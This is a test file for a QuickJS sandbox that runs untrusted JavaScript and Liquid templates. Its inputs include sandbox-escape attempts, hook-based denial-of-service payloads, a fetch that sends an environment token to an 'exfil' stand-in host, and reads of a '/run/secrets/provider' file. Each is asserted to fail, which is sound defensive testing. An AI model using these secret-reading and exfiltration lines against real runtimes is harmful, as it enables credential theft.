import { describe, expect, test } from 'bun:test';
import { runGuest } from './guest-runtime';
import { ISOLATION_LIMITS, type IsolatedRequest, type IsolationErrorCode } from './isolation-contract';

const js = (code: string, data: any = {}, mode: 'value' | 'template' = 'value') =>
  runGuest({ version: 1, kind: 'javascript', code, data, mode });
const liquid = (code: string, data: any = {}) =>
  runGuest({ version: 1, kind: 'liquid', code, data });
const ok = (value: any) => ({ version: 1 as const, ok: true as const, value });
const error = (code: IsolationErrorCode) => ({ version: 1 as const, ok: false as const, code });

describe('QuickJS guest: actual JavaScript execution', () => {
  test('returns plain nested JSON and reads normalized $ data', async () => {
    expect(await js('return {title: $.name, n: $.values.reduce((a,b)=>a+b,0), nil:null, flag:true, a:[1,"x"]};',
      { name: 'Foundation', values: [2, 3, 5] }))
      .toEqual(ok({ title: 'Foundation', n: 10, nil: null, flag: true, a: [1, 'x'] }));
    expect(await js('return Object.assign(Object.create(null), {n:1});')).toEqual(ok({ n: 1 }));
    expect(await js('return -0;')).toEqual(ok(0));
  });

  test('retains template variable extraction without exporting internal names', async () => {
    expect(await js('const title = $.name; let count = 4; var enabled = true; const __hidden = "hidden";',
      { name: 'StatusPanel' }, 'template')).toEqual(ok({ title: 'StatusPanel', count: 4, enabled: true }));
    expect(await js('', {}, 'template')).toEqual(ok({}));
  });

  test('Function and eval remain entirely inside the guest realm', async () => {
    expect(await js('return Function("return typeof process")();')).toEqual(ok('undefined'));
    expect(await js('return eval("21*2");')).toEqual(ok(42));
    expect(await js('return ({}).constructor.constructor("return typeof Bun")();')).toEqual(ok('undefined'));
  });

  test('captures serialization primordials before attacker mutation', async () => {
    expect(await js('JSON.stringify = () => {while(true){}}; Reflect.apply = () => {while(true){}}; return {safe:"ok"};'))
      .toEqual(ok({ safe: 'ok' }));
  });

  test('cannot reach caller arguments to increase the output budget', async () => {
    expect(await js('arguments.callee.caller.arguments[2].outputBytes=500000; return "x".repeat(100000);'))
      .toEqual(error('ISOLATION_FAILED'));
  });

  test('every run starts with a fresh realm and input snapshot', async () => {
    const input = { value: 1 };
    expect(await js('$.value=9; globalThis.leaked=7; return $.value;', input)).toEqual(ok(9));
    expect(input).toEqual({ value: 1 });
    expect(await js('return typeof leaked;')).toEqual(ok('undefined'));
  });
});

describe('QuickJS guest: strict return-value boundary', () => {
  test.each([
    'return {get value(){while(true){}}};',
    'return {toString(){while(true){}}};',
    'return {toJSON(){while(true){}}};',
    'return {valueOf(){while(true){}}};',
    'return {nested:{get toJSON(){while(true){}}}};',
    'return {f:()=>42};',
    'return Object.create({inherited:42});',
    'return new Date();',
    'return new Map();',
    'return Promise.resolve(42);',
    'return new Uint8Array([1,2]);',
    'return new String("x");',
    'return undefined;',
    'return NaN;',
    'return Infinity;',
    'return 1n;',
    'return Symbol("x");',
    'const a={}; a.a=a; return a;',
    'return [1,,3];',
    'const a=[1]; a.extra=2; return a;',
    'return Object.defineProperty({}, "hidden", {value:42});',
    'return {[Symbol("hidden")]:1};',
    'return {constructor: "fake"};',
    'return {prototype: "fake"};',
  ])('rejects non-data without invoking hooks: %s', async code => {
    const start = performance.now();
    expect(await js(code)).toEqual(error('ISOLATION_INVALID_OUTPUT'));
    // In particular, endless accessor/serialization hooks must not be executed.
    expect(performance.now() - start).toBeLessThan(ISOLATION_LIMITS.cpuMs);
  });

  test('cannot manufacture a proxy that traps serializer inspection', async () => {
    expect(await js('return new Proxy({}, {getOwnPropertyDescriptor(){while(true){}}});'))
      .toEqual(error('ISOLATION_FAILED'));
  });

  test('never inspects an attacker exception message, stack, toJSON or toString', async () => {
    expect(await js('throw { get message(){while(true){}}, get stack(){while(true){}}, toString(){while(true){}} };'))
      .toEqual(error('ISOLATION_FAILED'));
  });

  test('rejects depth overflow and bounds UTF-8 serialized JSON output', async () => {
    expect(await js('let x={}; for(let i=0;i<20;i++)x={x}; return x;')).toEqual(error('ISOLATION_INVALID_OUTPUT'));
    expect(await js('return "x".repeat(65534);')).toEqual(ok('x'.repeat(65534)));
    expect(await js('return "x".repeat(65535);')).toEqual(error('ISOLATION_OUTPUT_LIMIT'));
    expect(await js('return "😀".repeat(17000);')).toEqual(error('ISOLATION_OUTPUT_LIMIT'));
    expect(await js('return "漢".repeat(22000);')).toEqual(error('ISOLATION_OUTPUT_LIMIT'));
  });
});

describe('QuickJS guest: resources and capability absence', () => {
  test('interrupts a true infinite CPU loop and can run again afterwards', async () => {
    const start = performance.now();
    expect(await js('while(true){}')).toEqual(error('ISOLATION_TIMEOUT'));
    expect(performance.now() - start).toBeLessThan(ISOLATION_LIMITS.wallMs);
    expect(await js('return 42;')).toEqual(ok(42));
  });

  test('enforces the guest allocation cap and remains usable after memory pressure', async () => {
    const start = performance.now();
    const result = await js('const a=[]; for(let i=0;i<2000;i++)a.push(new Array(10000).fill(i)); return a.length;');
    expect(result.ok).toBe(false);
    if (!result.ok) expect(['ISOLATION_FAILED', 'ISOLATION_MEMORY_LIMIT']).toContain(result.code);
    expect(performance.now() - start).toBeLessThan(ISOLATION_LIMITS.wallMs);
    expect(await js('return 7;')).toEqual(ok(7));
  });

  test('caps stack exhaustion and does not expose host runtime, IO or timers', async () => {
    expect((await js('function recurse(){return recurse()} return recurse();')).ok).toBe(false);
    expect(await js('return [typeof process,typeof Bun,typeof require,typeof module,typeof fetch,typeof XMLHttpRequest,typeof WebSocket,typeof Deno,typeof Buffer,typeof setTimeout];'))
      .toEqual(ok(new Array(10).fill('undefined')));
    expect(await js('return require("node:fs").readFileSync("/run/secrets/provider", "utf8");'))
      .toEqual(error('ISOLATION_FAILED'));
    expect(await js('return fetch("https://example.invalid/exfil?token="+process.env.PROVIDER_REFRESH_TOKEN);'))
      .toEqual(error('ISOLATION_FAILED'));
    expect((await js('return import("node:fs");')).ok).toBe(false);
  });

  test('provider-like input credentials are redacted before guest evaluation', async () => {
    const sentinel = 'isolated-test-refresh-token-not-real';
    const result = await js('return $;', { title: 'safe', refreshToken: sentinel, nested: { password: sentinel } });
    expect(JSON.stringify(result)).not.toContain(sentinel);
    expect(result).toEqual(ok({ title: 'safe', refreshToken: '[REDACTED]', nested: { password: '[REDACTED]' } }));
  });

  test('rejects malformed and oversized requests before evaluating code', async () => {
    expect(await runGuest({ version: 2, kind: 'javascript', code: 'while(true){}', data: {} } as unknown as IsolatedRequest))
      .toEqual(error('ISOLATION_INVALID_INPUT'));
    expect(await js(' '.repeat(ISOLATION_LIMITS.codeChars + 1))).toEqual(error('ISOLATION_INVALID_INPUT'));
    expect(await js('return $;', { value: 'x'.repeat(ISOLATION_LIMITS.dataBytes) })).toEqual(error('ISOLATION_INVALID_INPUT'));
    let called = false;
    expect(await js('return $;', { get value() { called = true; return 1; } })).toEqual(error('ISOLATION_INVALID_INPUT'));
    expect(called).toBe(false);
  });
});

describe('QuickJS guest: Liquid browser bundle and TRMNL filters', () => {
  test('renders markup and replaces settings with an empty object', async () => {
    expect(await liquid('<h1>{{ title | escape }}</h1>{{ settings | json }}', { title: '<safe>', settings: { refreshToken: 'sentinel' } }))
      .toEqual(ok('<h1>&lt;safe&gt;</h1>{}'));
    expect(await liquid('{{ user.constructor }}{{ user.__proto__ }}', { user: { name: 'safe' } })).toEqual(ok(''));
  });

  test('retains number, currency, plural, mapping and grouping filters', async () => {
    expect(await liquid('{{ 1234567 | number_with_delimiter }} / {{ 10420 | number_to_currency: "£" }} / {{ "book" | pluralize: 2 }}'))
      .toEqual(ok('1,234,567 / £10,420.00 / 2 books'));
    expect(await liquid('{{ "5, 4, 3" | split: ", " | map_to_i | json }}')).toEqual(ok('[5,4,3]'));
    expect(await liquid('{% assign groups = items | group_by: "category" %}{{ groups.a | size }}', { items: [{ category: 'a' }, { category: 'a' }] }))
      .toEqual(ok('2'));
    expect(await liquid('{% assign item = items | find_by: "name", "Ryan" %}{{ item.name }}', { items: [{ name: 'Ryan' }] }))
      .toEqual(ok('Ryan'));
    expect(await liquid('{% assign obj = encoded | parse_json %}{{ obj.value }}', { encoded: '{"value":42}' })).toEqual(ok('42'));
  });

  test('retains date, random and sample filters', async () => {
    expect(await liquid('{{ "2025-10-02" | ordinalize }} / {{ "2025-01-11" | l_date: "%y %b" }}')).toEqual(ok('2nd / 25 Jan'));
    const date = await liquid('{{ 0 | days_ago }}');
    expect(date.ok && typeof date.value === 'string' && /^\d{4}-\d{2}-\d{2}$/.test(date.value)).toBe(true);
    const random = await liquid('{{ "chart-" | append_random }}');
    expect(random.ok && typeof random.value === 'string' && /^chart-[a-f0-9]{1,4}$/.test(random.value)).toBe(true);
    expect(await liquid('{{ items | sample }}', { items: ['one'] })).toEqual(ok('one'));
  });

  test.each([
    '{% include "/run/secrets/provider" %}', '{%- render "other" -%}',
    '{% layout "other" %}', '{{ items | where_exp: "item", "item.active" }}',
    '{% liquid\ninclude "/run/secrets/provider"\n%}',
  ])('forbids template IO and expression extensions: %s', async code => {
    expect(await liquid(code)).toEqual(error('ISOLATION_FAILED'));
  });

  test('bounds oversized output and pathological Liquid loops', async () => {
    const oversized = await liquid('{% for i in (1..400) %}{{ chunk }}{% endfor %}', { chunk: 'x'.repeat(1024) });
    expect(oversized.ok).toBe(false);
    const start = performance.now();
    const loops = await liquid('{% for i in (1..1000000000) %}{% for j in (1..1000000000) %}x{% endfor %}{% endfor %}');
    expect(loops.ok).toBe(false);
    expect(performance.now() - start).toBeLessThan(ISOLATION_LIMITS.wallMs);
    expect(await liquid('still {{ status }}', { status: 'ready' })).toEqual(ok('still ready'));
  });
});
